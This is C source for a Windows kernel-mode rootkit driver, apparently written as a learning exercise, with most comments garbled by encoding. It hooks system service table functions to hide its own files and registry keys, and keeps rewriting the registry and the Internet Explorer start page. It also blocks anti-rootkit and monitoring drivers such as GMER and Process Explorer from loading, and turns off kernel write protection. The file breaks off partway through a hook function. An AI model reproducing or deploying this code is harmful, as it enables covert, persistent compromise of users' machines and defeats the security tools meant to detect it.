

#include <ntddk.h>
#include "struct.h"
#include "nvmini.h"
#include "HideService.h"



/////////////////////////////////////////////////////////////////         --          --     
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//     --     -      -     -- 
//+                                                           +//     --      -   -       -- 
//+                 ����ȫ�ֱ�����һЩ����                    +//      --       -        --  
//+                                                           +//       -     sudami     -   
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//        --            --    
/////////////////////////////////////////////////////////////////          --        --  
//                                                                           --    --
//		                                                                        --

#define ThreadProc           0x22C
#define ThreadListHead       0x190


typedef PVOID
(NTAPI *PRTL_ALLOCATE_STRING_ROUTINE)(
									  SIZE_T NumberOfBytes
									  );

typedef PETHREAD (*My_PsGetNextProcessThread)(
	PEPROCESS Process,
	PETHREAD Thread
	);
My_PsGetNextProcessThread g_PsGetNextProcessThread;

typedef ULONG (*My_KeForceResumeThread) (
	PKTHREAD Thread
	);
My_KeForceResumeThread g_KeForceResumeThread;



typedef VOID (*My_KeAcquireInStackQueuedSpinLockRaiseToSynch)(
	PKSPIN_LOCK SpinLock,
	PKLOCK_QUEUE_HANDLE LockHandle
	);
My_KeAcquireInStackQueuedSpinLockRaiseToSynch g_KeAcquireInStackQueuedSpinLockRaiseToSynch;


typedef VOID (*My_KeReleaseInStackQueuedSpinLock)(
	PKLOCK_QUEUE_HANDLE LockHandle
	);
My_KeReleaseInStackQueuedSpinLock g_KeReleaseInStackQueuedSpinLock;


typedef VOID (*My_KeAcquireQueuedSpinLockAtDpcLevel)(
	PKSPIN_LOCK_QUEUE LockQueue
	);
My_KeAcquireQueuedSpinLockAtDpcLevel g_KeAcquireQueuedSpinLockAtDpcLevel;


typedef VOID (*My_KeReleaseQueuedSpinLockFromDpcLevel)(
	PKSPIN_LOCK_QUEUE LockQueue
	);
My_KeReleaseQueuedSpinLockFromDpcLevel g_KeReleaseQueuedSpinLockFromDpcLevel;


typedef VOID (*KIINSERTQUEUEAPC) (
								  PKAPC Apc,
								  KPRIORITY Increment
								  );
KIINSERTQUEUEAPC KiInsertQueueApc;


typedef NTSTATUS (*NTQUERYSYSTEMINFORMATION)(

	IN ULONG                        SystemInformationClass,
	OUT PVOID                        SystemInformation,
	IN ULONG                        SystemInformationLength,
	OUT PULONG                        ReturnLength OPTIONAL  
	);
NTQUERYSYSTEMINFORMATION NtQuerySystemInformation;


typedef NTSTATUS (*PSPTERMINATETHREADBYPOINTER)(
	IN PETHREAD Thread,
	IN NTSTATUS ExitStatus
	);
PSPTERMINATETHREADBYPOINTER PspTerminateThreadByPointer;


typedef VOID (*PSPEXITTHREAD)(
							  IN NTSTATUS ExitStatus
							  );
PSPEXITTHREAD PspExitThread;


#define PS_TEST_SET_BITS(Flags, Flag) \
	InterlockedOr (Flags, Flag)


PVOID
ExpAllocateStringRoutine (
						  IN SIZE_T NumberOfBytes
						  )
{
	return ExAllocatePoolWithTag (PagedPool,NumberOfBytes,'grtS');
}

#ifdef ALLOC_DATA_PRAGMA
#pragma const_seg("PAGECONST")
#endif
const PRTL_ALLOCATE_STRING_ROUTINE RtlAllocateStringRoutine = ExpAllocateStringRoutine;
#ifdef ALLOC_DATA_PRAGMA
#pragma const_seg()
#endif

BYTE g_Code[5] = { 0x33, 0xC0, 0x0C, 0x00, 0x00 }; // �޸�DLL��ǰ5�ֽ�Ϊ������
BYTE KeInsertQueueApc_orig_code[9] = { 0x8B, 0xFF, 0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x0C, 0x53 }; 
BYTE PspTerminateThreadByPointer_orig_code[8] = { 0x8B, 0xFF, 0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x0C}; 
BYTE KiInsertQueueApc_orig_code[11] = { 0x8B, 0xFF, 0x55, 0x8B, 0xEC, 0x51, 0x8b, 0xC1, 0x80, 0x78, 0x2E};

BYTE g_HookCode[5] = { 0xe9, 0, 0, 0, 0 };
BYTE g_OrigCode[5] = { 0 }; // ԭ������ǰ5�ֽ�����
BYTE jmp_orig_code[7] = { 0xEA, 0, 0, 0, 0, 0x08, 0x00 }; 

BOOL g_bHooked = FALSE;
BOOL g_bMP = FALSE;

PUCHAR NtTerminateProcess;


PEPROCESS pObject[128];            // ����Ҫ�������̵�EPROCESS

PKEVENT g_MyEvent;
HANDLE g_LatestProcID;
HANDLE g_MyEventHandle;
PVOID       g_address = 0;
KSPIN_LOCK  g_SpinLock;
BOOL MDLinit = FALSE;
PVOID    pThreadObj_reg		= NULL; // ����дע�����̶߳���
PVOID    pThreadObj_reg_IE  = NULL;
PVOID    pThreadObj_reg_Group  = NULL;
PVOID    pThreadObj_sdt     = NULL;
PVOID    pThreadObj_Kill     = NULL;
PVOID    pEventObject       = NULL;

ULONG CurrentIndex = 0;     // ��fake�����л����
ULONG NbHiddenKeys = 0;

WCHAR *FileToHide[128];     // ��Ϊȫ�ֱ���. ������Ҫ���ص�����
WCHAR *RegKeyToHide[128];   // ��DriverEntry������õ�
WCHAR *RegValueToHide[128];

ULONG NbRegKeyToHide   = 0;  // ��Ϊȫ�ֱ���. ������Ҫ�������ݵ�����
ULONG NbRegValueToHide = 0;
ULONG NbFileToHide     = 0;  // ��DriverEntry������õ�

WCHAR SidStringBuffer[512];                   /* ���浱ǰ�û���SID */
ULONG g_SidStringLength;

LARGE_INTEGER g_timeout;                     /* �����޸�sdt���̵߳�ʱ���� */
PKTIMER g_pKTimer;                           /* ���ں˶�ʱ���й�,����hook ssdt */ 
PKTIMER g_pKTimer_sdt;
PKDPC   g_pKDpc;
HANDLE  g_CurrentHandle;                     /* ��IsExistSDT�е��� */
HANDLE  g_EventHandle;                       /* �¼�������,�ͷ���дע������ */
HANDLE  g_EventHandle_IE;                    /* �¼�������,�ͷ���дע������ */

WCHAR *reg_buf_a  = L"sudami";
WCHAR *reg_buf_b  = L"LEGACY_SUDAMI";
WCHAR *reg_buf_c  = L"Start Page";
WCHAR *file_buf_a = L"sudami.sys";
WCHAR *file_buf_b = L"autorun.inf";
WCHAR *file_buf_c = L"sudami.exe";
WCHAR *reg_name   = L"\\REGISTRY\\MACHINE\\SYSTEM";

WCHAR *ban_1 = L"ISPUBDRV";                  /* ��ֹ������Щ�����ļ��� */
WCHAR *ban_2 = L"ISDRV1";
WCHAR *ban_3 = L"RKREVEAL";
WCHAR *ban_4 = L"PROCEXP";
WCHAR *ban_5 = L"SAFEMON";
WCHAR *ban_6 = L"RKHDRV";
WCHAR *ban_7 = L"NPF";
WCHAR *ban_8 = L"IRIS";
WCHAR *ban_9 = L"NPPINT";
WCHAR *ban_a = L"DUMP_WMIMMC";
WCHAR *ban_b = L"SPLITTER";
WCHAR *ban_c = L"EAGLENT";
WCHAR *ban_d = L"IMAGEPATH";
WCHAR *ban_e = L"GMER";


int pos_Close;                               /* ������Щ�����ķ���� */
int pos_LoadDriver;
int pos_QueryDirectoryFile;
int pos_SaveKey;
int pos_DeleteKey;
int pos_EnumerateKey;
int pos_DeleteValueKey;

BOOL ZwClose_Hooked				    = FALSE; /* �Ƿ��Ѿ�HOOK�� */
BOOL ZwLoadDriver_Hooked			= FALSE;
BOOL ZwQueryDirectoryFile_Hooked	= FALSE;
BOOL ZwSaveKey_Hooked			    = FALSE;
BOOL ZwDeleteKey_Hooked				= FALSE;
BOOL ZwEnumerateKey_Hooked			= FALSE;
BOOL ZwDeleteValueKey_Hooked		= FALSE;
BOOL g_bRepeatWrite_reg             = FALSE; /* �Ƿ񷴸�д��ע��� */
BOOL g_bRepeatWrite_reg_IE          = FALSE; /* �Ƿ񷴸�д��ע��� */
BOOL g_bRepeatWrite_sdt             = FALSE; /* �Ƿ񷴸�д��ע��� */
BOOL g_bRepeatWrite_reg_Group       = FALSE;
BOOL g_bRepeatWrite_Kill             = FALSE;


typedef struct ServiceDescriptorEntry {
	unsigned int *ServiceTableBase;
	unsigned int *ServiceCounterTableBase; 
	unsigned int NumberOfServices;
	unsigned char *ParamTableBase;
} ServiceDescriptorTableEntry, *PServiceDescriptorTableEntry;

extern PServiceDescriptorTableEntry KeServiceDescriptorTable; 

#define ibaseDD *(PDWORD)&ibase


DWORD 
NTAPI 
GetHeaders (
			PCHAR ibase,
			PIMAGE_FILE_HEADER      *pfh,
			PIMAGE_OPTIONAL_HEADER  *poh,
			PIMAGE_SECTION_HEADER   *psh
			)

			/*++

			Learner : sudami [xiao_rui_119@163.com]
			Time    : 08/01/16

			���� :
			��

			���� : 
			,ͨ����������ibase,�õ�PE�ڸ����ṹ��ƫ����

			--*/
{
	PIMAGE_DOS_HEADER mzhead=(PIMAGE_DOS_HEADER)ibase;

	if	((mzhead->e_magic!=IMAGE_DOS_SIGNATURE) ||		
		(ibaseDD[mzhead->e_lfanew]!=IMAGE_NT_SIGNATURE))
		return FALSE;

	*pfh=(PIMAGE_FILE_HEADER)&ibase[mzhead->e_lfanew];
	if (((PIMAGE_NT_HEADERS)*pfh)->Signature!=IMAGE_NT_SIGNATURE) 
		return FALSE;
	*pfh=(PIMAGE_FILE_HEADER)((PBYTE)*pfh+sizeof(IMAGE_NT_SIGNATURE));

	*poh=(PIMAGE_OPTIONAL_HEADER)((PBYTE)*pfh+sizeof(IMAGE_FILE_HEADER));
	if ((*poh)->Magic!=IMAGE_NT_OPTIONAL_HDR32_MAGIC)
		return FALSE;

	*psh=(PIMAGE_SECTION_HEADER)((PBYTE)*poh+sizeof(IMAGE_OPTIONAL_HEADER));
	return TRUE;
}



/////////////////////////////////////////////////////////////////         --          --     
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//     --     -      -     -- 
//+                                                           +//     --      -   -       -- 
//+             ���漸������������ں���غ���                +//      --       -        --  
//+                                                           +//       -     sudami     -   
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//        --            --    
/////////////////////////////////////////////////////////////////          --        --  
//                                                                           --    --
//		                                                                        --


VOID 
OnUnload( 
		 IN PDRIVER_OBJECT DriverObject 
		 )
{
	UNICODE_STRING devlink;
	int i;
	LARGE_INTEGER interval;
	interval.QuadPart = -4 * 1000 * 100;     // 40ms, relative

	i = 0;
	while (i < 128) {
		if (pObject[i] != NULL) {
			ExFreePool( pObject[i] );
		}
		i++;
	}

	MyUnHook ();

	for(i=0; i<NbFileToHide; i++)
		ExFreePool( FileToHide[i] );
	for(i=0; i<NbRegKeyToHide; i++)
		ExFreePool( RegKeyToHide[i] );
	for(i=0; i<NbRegValueToHide; i++)
		ExFreePool( RegValueToHide[i] ); 

	// ֹͣдע�����߳�
	g_bRepeatWrite_reg		 = FALSE;
	g_bRepeatWrite_sdt		 = FALSE;
	g_bRepeatWrite_reg_IE    = FALSE;
	g_bRepeatWrite_reg_Group = FALSE;
	g_bRepeatWrite_Kill      = FALSE;

	i = 5;
	while (i > 0) { // �ȴ�5 * 40ms ,������2���߳̽���
		i--;
		KeDelayExecutionThread( KernelMode, FALSE, &interval );
	}

	if (g_bHooked) {
		UnHookKiInsertQueueApc ();
	}

	KeSetEvent(pEventObject, 0, FALSE); // ��������"дע������"���¼�״̬Ϊ"����"
	KeWaitForSingleObject( pThreadObj_reg, Executive, KernelMode, FALSE, NULL );
	KeWaitForSingleObject( pThreadObj_reg_IE, Executive, KernelMode, FALSE, NULL );
	KeWaitForSingleObject( pThreadObj_sdt, Executive, KernelMode, FALSE, NULL );


	KeWaitForSingleObject( pThreadObj_Kill, Executive, KernelMode, FALSE, NULL );

	if (pThreadObj_Kill != NULL) { // �� thread object����,�ͷŵ�,Ҫ����BSOD
		ObDereferenceObject( pThreadObj_Kill );
		pThreadObj_Kill = NULL;
	}


	if (pThreadObj_reg != NULL) { // �� thread object����,�ͷŵ�,Ҫ����BSOD
		ObDereferenceObject( pThreadObj_reg );
		pThreadObj_reg = NULL;
	}


	RtlInitUnicodeString(&devlink,SUDAMI_DOS_DEVICE_NAME_W);
	IoDeleteSymbolicLink(&devlink);
	if (DriverObject->DeviceObject)
	{
		IoDeleteDevice(DriverObject->DeviceObject);
	}

}


NTSTATUS 
DriverEntry( 
			IN PDRIVER_OBJECT theDriverObject, 
			IN PUNICODE_STRING theRegistryPath 
			)
{
	int i;
	UNICODE_STRING dllName;
	DWORD functionAddress;
	UNICODE_STRING devname;
	UNICODE_STRING devlink;
	PDEVICE_OBJECT devob ;
	NTSTATUS status ;
	PEPROCESS		proc; 
	WCHAR			Buffer[128];
	UNICODE_STRING KeyName;
	UNICODE_STRING a;
	UNICODE_STRING sudami;
	UNICODE_STRING event_name;

	DbgPrint("My Driver Loaded!\n");
	DbgPrint("���������޶���,ֻ������.\n����С���ж�,������ע���Ȩ�޺�ɾ����������\nsudami [sudami@163.com] --08/03/23\n");

	RtlInitUnicodeString(&devname,SUDAMI_DEVICE_NAME_W);
	RtlInitUnicodeString(&devlink,SUDAMI_DOS_DEVICE_NAME_W);

	status = IoCreateDevice(theDriverObject,
		256,
		&devname,
		FILE_DEVICE_SUDAMI,
		0,
		TRUE,
		&devob);

	if (!NT_SUCCESS(status))
	{
		return status ;
	}

	status = IoCreateSymbolicLink(&devlink,&devname);

	if (!NT_SUCCESS(status))
	{
		IoDeleteDevice(devob);
		return status;
	}

	theDriverObject->MajorFunction[IRP_MJ_CREATE] = 
	theDriverObject->MajorFunction[IRP_MJ_CLOSE] = DevCreateClose;
	theDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DevDispatch ;
	theDriverObject->DriverUnload  = OnUnload;

	////////////////////////////////////////

	GetOrigAddr ();


	//ΪҪ���ص����ݷ����ڴ�
	AddObjectToHide( FileToHide, &NbFileToHide, file_buf_a); // �����ļ�
	AddObjectToHide( FileToHide, &NbFileToHide, file_buf_b);
	AddObjectToHide( FileToHide, &NbFileToHide, file_buf_c);

	AddObjectToHide( RegKeyToHide, &NbRegKeyToHide, reg_buf_a); // ���ط���
	AddObjectToHide( RegKeyToHide, &NbRegKeyToHide, reg_buf_b);

	AddObjectToHide( RegValueToHide, &NbRegValueToHide, reg_buf_c); // ����IE�� start page


	// HOOK SSDT
	MyStartHook ();

	//����һ��ϵͳ�߳�������дע���. ����å�� o(*.*)0
	StartThread_reg ();

	//����һ��ϵͳ�߳�������дsdt
	StartThread_sdt ();
	StartThread_reg_IE ();
	StartThread_reg_Group();


	// ģ�����֪ͨ
	status = PsSetLoadImageNotifyRoutine( MyLoadImageRoutine );
	if (!NT_SUCCESS( status )) {
		DbgPrint("PsSetLoadImageNotifyRoutine()\n");
		return status;
	}


	IsMPExist();
	FindPsXXAddr();   // �ҵ�PspTerminateThreadByPointer �� NtTerminateProcess

	// ��΢�㲻���ڣ���������������ֱ�ӵõ�PspTerminateThreadByPointer �ĵ�ַ
	XPGetPsGetNextProcessThread(); // ����NtTerminateProcess�ҵ�PsGetNextProcessThread


	//�ָ�kv2008 inline hook
	XPRestoreKeInsertQueueApc ();
	XPRestoreKiInsertQueueApc ();
	XPRestorePspTerminateThreadByPointer ();
	XPRestoreNtTerminateProcess ();
	XPRestorePsGetNextProcessThread  ();

	//HookKiInsertQueueApc ();

	StartThread_Kill ();

	return STATUS_SUCCESS;
}


NTSTATUS
DevCreateClose(
			   IN PDEVICE_OBJECT  DeviceObject,
			   IN PIRP  Irp
			   )
{

	Irp->IoStatus.Status = 0;
	Irp->IoStatus.Information = 0 ;

	IoCompleteRequest(Irp,IO_NO_INCREMENT);

	return STATUS_SUCCESS ;

}

NTSTATUS
DevDispatch(
			IN PDEVICE_OBJECT  DeviceObject,
			IN PIRP  Irp
			)
{
	PIO_STACK_LOCATION StackLocation = IoGetCurrentIrpStackLocation(Irp);
	ULONG IRPcode = StackLocation->Parameters.DeviceIoControl.IoControlCode;    
	WCHAR *buf;
	buf = (WCHAR*)Irp->AssociatedIrp.SystemBuffer;

	switch( IRPcode ) {

		case 1000:
			DbgPrint("IoControlCode 1000\n");
			RtlCopyMemory( buf, g_LatestProcID, sizeof( g_LatestProcID ) );
			//KeResetEvent( g_MyEvent );

			break;

		default:
			break;
	}

	Irp->IoStatus.Status = 0;
	IoCompleteRequest(Irp,IO_NO_INCREMENT);
	return STATUS_SUCCESS ;
}


/////////////////////////////////////////////////////////////////         --          --     
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//     --     -      -     -- 
//+                                                           +//     --      -   -       -- 
//+                       3���Ӻ���                           +//      --       -        --  
//+                                                           +//       -     sudami     -   
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//        --            --    
/////////////////////////////////////////////////////////////////          --        --  
//                                                                           --    --
//		                                                                        --

// д�����Ŀ�&��
void WPOFF()
{
	__asm {   //ȥ���ڴ汣��
		cli
			mov  eax,cr0
			and  eax,not 10000h
			mov  cr0,eax
	}
}

void WPON()
{
	__asm {   //�ָ��ڴ汣��  
		mov  eax,cr0
			or   eax,10000h
			mov  cr0,eax
			sti
	} 
}

void 
AddObjectToHide (
				 WCHAR **Tab, 
				 PULONG Nb, 
				 WCHAR *Object
				 )
				 /*++

				 ����: sudami  08/02/28 [add from agony]

				 ����:
				 Tab - 2��ָ��,����Ҫ���ص���

				 Nb - ���صĸ���.�ɹ�����һ��,���ֵ���Լ�һ��

				 Object - ����Ҫ���ص�ֵ,Ϊ������Ƿ�ҳ�ڴ�

				 ����:
				 ΪҪ���ص����ݷ����ڴ�

				 --*/
{
	ULONG i;  
	SIZE_T size = (wcslen(Object)+1)*sizeof(WCHAR);  

	// ���Ѿ�����,�Ͳ����ٴ�hide��
	for (i=0; i<*Nb; i++) {
		if( size == ( wcslen (Tab[i]) + 1 ) * sizeof( WCHAR ) &&\
			!memcmp (Object, Tab[i], size) )  
			return;         
	}         

	if( *Nb < 128 ) {
		Tab[*Nb] = (WCHAR*) ExAllocatePool( PagedPool, size );

		if( Tab[*Nb] ) { 
			memcpy( Tab[*Nb], Object, size); 
			(*Nb)++;
		}   
	}       
}


/////////////////////////////////////////////////////////////////         --          --     
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//     --     -      -     -- 
//+                                                           +//     --      -   -       -- 
//+          ����2���������ڵõ�����SDT�����ĵ�ַ             +//      --       -        --  
//+                                                           +//       -     sudami     -   
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//        --            --    
/////////////////////////////////////////////////////////////////          --        --  
//                                                                           --    --
//		                                                                        --


DWORD 
GetDllFunctionAddress (
					   char* lpFunctionName, 
					   PUNICODE_STRING pDllName
					   )
					   /*++

					   ����: sudami  08/02/28

					   ����:
					   lpFunctionName - ��������
					   pDllName - Ҫӳ���ģ������

					   ���� : 
					   �Ѹ�����ģ��ӳ�䵽�ڴ�,��ȡ��EAT,�õ�Zwϵ�к�����ַ,����R3��,

					   1.  ӳ��ntdll.dll���ڴ�-->ZwMapViewOfSection.
					   2.  ������EAT, �õ� ZwXxxx�ĵ�ַp
					   3.  p + 1 ������ntdll.dll ת��ntoskrnl.exe�ķ����. 
					   4.  NtXxxx �ĵ�ַ �Ϳ���ͨ���������� ��KeServiceDescriptorTable��ȡ��
					   5. �����fake�����滻������.

					   --*/
{
	HANDLE hThread, hSection, hFile, hMod;
	SECTION_IMAGE_INFORMATION sii;
	IMAGE_DOS_HEADER* dosheader;
	IMAGE_OPTIONAL_HEADER* opthdr;
	IMAGE_EXPORT_DIRECTORY* pExportTable;
	DWORD* arrayOfFunctionAddresses;
	DWORD* arrayOfFunctionNames;
	WORD* arrayOfFunctionOrdinals;
	DWORD functionOrdinal;
	DWORD Base, x, functionAddress;
	char* functionName;
	STRING ntFunctionName, ntFunctionNameSearch;
	PVOID BaseAddress = NULL;
	SIZE_T size=0;

	OBJECT_ATTRIBUTES oa = {sizeof oa, 0, pDllName, OBJ_CASE_INSENSITIVE};

	IO_STATUS_BLOCK iosb;

	//_asm int 3;
	ZwOpenFile(&hFile, FILE_EXECUTE | SYNCHRONIZE, &oa, &iosb, FILE_SHARE_READ, FILE_SYNCHRONOUS_IO_NONALERT);

	oa.ObjectName = 0;

	ZwCreateSection(&hSection, SECTION_ALL_ACCESS, &oa, 0,PAGE_EXECUTE, SEC_IMAGE, hFile);

	ZwMapViewOfSection(hSection, NtCurrentProcess(), &BaseAddress, 0, 1000, 0, &size, (SECTION_INHERIT)1, MEM_TOP_DOWN, PAGE_READWRITE);

	ZwClose(hFile);

	hMod = BaseAddress;

	dosheader = (IMAGE_DOS_HEADER *)hMod;

	opthdr =(IMAGE_OPTIONAL_HEADER *) ((BYTE*)hMod+dosheader->e_lfanew+24);

	pExportTable =(IMAGE_EXPORT_DIRECTORY*)((BYTE*) hMod + opthdr->DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT]. VirtualAddress);

	arrayOfFunctionAddresses = (DWORD*)( (BYTE*)hMod + pExportTable->AddressOfFunctions);

	arrayOfFunctionNames = (DWORD*)( (BYTE*)hMod + pExportTable->AddressOfNames);

	arrayOfFunctionOrdinals = (WORD*)( (BYTE*)hMod + pExportTable->AddressOfNameOrdinals);

	Base = pExportTable->Base;

	RtlInitString(&ntFunctionNameSearch, lpFunctionName);

	for(x = 0; x < pExportTable->NumberOfFunctions; x++) {
		functionName = (char*)( (BYTE*)hMod + arrayOfFunctionNames[x]);

		RtlInitString(&ntFunctionName, functionName);

		functionOrdinal = arrayOfFunctionOrdinals[x] + Base - 1; 
		functionAddress = (DWORD)( (BYTE*)hMod + arrayOfFunctionAddresses[functionOrdinal]);
		if (RtlCompareString(&ntFunctionName, &ntFunctionNameSearch, TRUE) == 0) {
			ZwClose(hSection);
			return functionAddress;
		}
	}

	ZwClose(hSection);
	return 0;
}


VOID 
GetOrigAddr (
			 )
			 /*++

			 ����: sudami  08/02/28

			 ���� : 
			 ���sdt��Ҫ���صĺ����ĵ�ַ. ֮ǰ���ú��� GetDllFunctionAddress �Ա��÷����

			 --*/
{
	UNICODE_STRING dllName;
	DWORD          functionAddress;
	int            position;

	RtlInitUnicodeString( &dllName, L"\\Device\\HarddiskVolume1\\Windows\\System32\\ntdll.dll" );

	// ZwClose
	functionAddress = GetDllFunctionAddress("ZwClose", &dllName);
	position        = *((WORD*)( functionAddress + 1 ));
	pos_Close       = position;
	DbgPrint("ZwClose's Id:%d\n", position);
	Orig_ZwClose = (ZWCLOSE) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + position));
	DbgPrint("ZwClose: %s\n", Orig_ZwClose);

	// ZwLoadDriver
	functionAddress = GetDllFunctionAddress("ZwLoadDriver", &dllName);
	position        = *((WORD*)( functionAddress + 1 ));
	pos_LoadDriver  = position;
	DbgPrint("ZwLoadDriver's Id:%d\n", position);
	Orig_ZwLoadDriver =  (ZWLOADDRIVER) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + position));
	DbgPrint("ZwLoadDriver: %s\n", Orig_ZwLoadDriver);

	// ZwQueryDirectoryFile
	functionAddress = GetDllFunctionAddress("ZwQueryDirectoryFile", &dllName);
	position        = *((WORD*)( functionAddress + 1 ));
	pos_QueryDirectoryFile = position;
	DbgPrint("ZwQueryDirectoryFile's Id:%d\n", position);
	Orig_ZwQueryDirectoryFile = (ZWQUERYDIRECTORYFILE) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + position));

	// ZwSaveKey
	functionAddress = GetDllFunctionAddress("ZwSaveKey", &dllName);
	position        = *((WORD*)( functionAddress + 1 ));
	pos_SaveKey     = position;
	DbgPrint("ZwSaveKey's Id:%d\n", position);
	Orig_ZwSaveKey = (ZWSAVEKEY) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + position));

	// ZwDeleteKey
	functionAddress = GetDllFunctionAddress("ZwDeleteKey", &dllName);
	position        = *((WORD*)( functionAddress + 1 ));
	pos_DeleteKey   = position;
	DbgPrint("ZwDeleteKey's Id:%d\n", position);
	Orig_ZwDeleteKey = (ZWDELETEKEY) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + position));

	// ZwEnumerateKey
	functionAddress = GetDllFunctionAddress("ZwEnumerateKey", &dllName);
	position        = *((WORD*)( functionAddress + 1 ));
	pos_EnumerateKey = position;
	DbgPrint("ZwEnumerateKey's Id:%d\n", position);
	Orig_ZwEnumerateKey = (ZWENUMERATEKEY) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + position));


	// ZwDeleteValueKey
	functionAddress = GetDllFunctionAddress("ZwDeleteValueKey", &dllName);
	position        = *((WORD*)( functionAddress + 1 ));
	pos_DeleteValueKey = position;
	DbgPrint("ZwDeleteValueKey's Id:%d\n", position);
	Orig_ZwDeleteValueKey = (ZWDELETEVALUEKEY) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + position));

}

/////////////////////////////////////////////////////////////////         --          --     
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//     --     -      -     -- 
//+                                                           +//     --      -   -       -- 
//+            ������7��fake����������һЩ����                +//      --       -        --  
//+                                                           +//       -     sudami     -   
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//        --            --    
/////////////////////////////////////////////////////////////////          --        --  
//                                                                           --    --
//		    																	--

NTSTATUS  fake_ZwClose( 
					   IN HANDLE  Handle
					   )
					   /*++

					   ����: sudami  08/02/28

					   ���� : 
					   �滻���� ZwClose ,��û������������,ԭ������Ҳ�����������ͷ��ڴ�

					   --*/
{
	NTSTATUS     st;
	st = Orig_ZwClose (Handle);

	return st;
}


NTSTATUS 
fake_ZwEnumerateKey(
					IN HANDLE  KeyHandle,
					IN ULONG  Index,
					IN KEY_INFORMATION_CLASS  KeyInformationClass,
					OUT PVOID  KeyInformation,
					IN ULONG  Length,
					OUT PULONG  ResultLength
					)
					/*++

					����: sudami  08/02/28

					���� : 
					�滻���� ZwEnumerateKey -- ����ע����ֵ

					--*/
{/*
 NTSTATUS st;
 PCWSTR KeyNamePtr;

 st = Orig_ZwEnumerateKey( KeyHandle, Index, KeyInformationClass, KeyInformation,\
 Length, ResultLength );

 if ( Status == STATUS_SUCCESS ) {
 _asm {
 push edi
 mov edi, KeyInformation
 add edi, 0x10
 mov KeyNamePtr, edi
 pop edi
 }

 if ( wcsstr( KeyNamePtr, L"nvmini" ) != NULL || \
 wcsstr ( KeyNamePtr, L"LEGACY_NVMINI") != NULL ) {

 if ( !FindAddrThrouhtNonPage ((PCHAR)KeyHandle) ) {
 MyAllocatePool (KeyHandle, Index);
 }

 Index++; // ���˵��Լ�Ҫ���ص�����
 st = Orig_ZwEnumerateKey( KeyHandle, Index, KeyInformationClass, KeyInformation,\
 Length, ResultLength );
 }
 }

 return st;
 */
	NTSTATUS status;
	PBYTE	 key;
	ULONG	 NameOffset;
	ULONG	 NameSizeOffset;
	WCHAR	 *KeyNamePtr;
	PULONG	 KeyNameLength;
	ULONG	 i;

	if( Index != (CurrentIndex-NbHiddenKeys) ) {
		CurrentIndex = Index;
		NbHiddenKeys = 0;
	}

	status = Orig_ZwEnumerateKey(
		KeyHandle,
		CurrentIndex,
		KeyInformationClass,
		KeyInformation,
		Length,
		ResultLength);   

	if( !NT_SUCCESS(status) ) 
		return status;  

	key = KeyInformation;   

	switch( KeyInformationClass )
	{   
	case KeyBasicInformation:
		NameOffset = ((ULONG)&(((PKEY_BASIC_INFORMATION)key)->Name)) - ((ULONG)key);
		NameSizeOffset = ((ULONG)&(((PKEY_BASIC_INFORMATION)key)->NameLength)) - ((ULONG)key);                  
		break;

	case KeyNodeInformation:
		NameOffset = ((ULONG)&(((PKEY_NODE_INFORMATION)key)->Name)) - ((ULONG)key);
		NameSizeOffset = ((ULONG)&(((PKEY_NODE_INFORMATION)key)->NameLength)) - ((ULONG)key);                             
		break;       

	case KeyNameInformation:
		NameOffset = ((ULONG)&(((PKEY_VALUE_FULL_INFORMATION)key)->Name)) - ((ULONG)key);
		NameSizeOffset = ((ULONG)&(((PKEY_VALUE_FULL_INFORMATION)key)->NameLength)) - ((ULONG)key);                    
		break;                   

	default:
		return status;      
	}   

	// �õ�ע�����������ƺͳ���
	KeyNamePtr = (WCHAR*)((PBYTE)key + NameOffset);
	KeyNameLength = (PULONG) ((PBYTE)key + NameSizeOffset);   

	if( KeyNamePtr == NULL )
		return status;

	// ��ʼ��������Ҫ���صļ�ֵ���бȽ�.����,������֮
	for( i=0; i<NbRegKeyToHide; i++) {      
		if( *KeyNameLength == wcslen(RegKeyToHide[i])*2 && \
			!memcmp(KeyNamePtr,RegKeyToHide[i],*KeyNameLength)) {

				// ƥ��,����֮
				CurrentIndex++;

				// �ݹ����
				status = fake_ZwEnumerateKey(
					KeyHandle,
					CurrentIndex,
					KeyInformationClass,
					KeyInformation,
					Length,
					ResultLength);

				NbHiddenKeys++;    
				return status;
		}    
	} 
	CurrentIndex++; 
	return status;  
}


NTSTATUS 
fake_ZwQueryDirectoryFile(
						  IN HANDLE FileHandle,
						  IN HANDLE Event OPTIONAL,
						  IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
						  IN PVOID ApcContext OPTIONAL,
						  OUT PIO_STATUS_BLOCK IoStatusBlock,
						  OUT PVOID FileInformation,
						  IN ULONG FileInformationLength,
						  IN FILE_INFORMATION_CLASS FileInformationClass,
						  IN BOOLEAN ReturnSingleEntry,
						  IN PUNICODE_STRING FileName OPTIONAL,
						  IN BOOLEAN RestartScan
						  )
						  /*++

						  ����: sudami  08/02/28

						  ���� : 
						  �滻���� ZwQueryDirectoryFile -- �����ļ�

						  --*/
{
	NTSTATUS   status;
	ULONG		i;
	ULONG		NameOffset;
	ULONG		NameSizeOffset;
	WCHAR		*FileNamePtr;
	PULONG		FileNameLength;
	PBYTE		curr, prev;
	PULONG		DeltaCurr, DeltaPrev;
	UNICODE_STRING UnicodeFilename ;


